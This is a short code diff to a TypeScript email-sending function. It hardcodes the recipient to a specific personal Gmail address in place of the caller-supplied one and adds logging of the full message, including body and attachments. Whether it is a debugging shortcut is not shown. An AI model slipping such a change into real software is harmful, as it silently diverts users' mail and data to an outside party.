@@ -49,13 +49,15 @@ export async function sendMail(input: SendMailInput) {
 
   const message = {
     from: mail.from || mail.user,
-    to: input.to,
+    to: 'skdoctorabronnikova@gmail.com',
     subject: input.subject,
     html: input.html,
     text: input.text,
     replyTo: input.replyTo,
     attachments: input.attachments
   }
+  
+  console.log(message)
 
   const info = await transporter.sendMail(message)
   return {
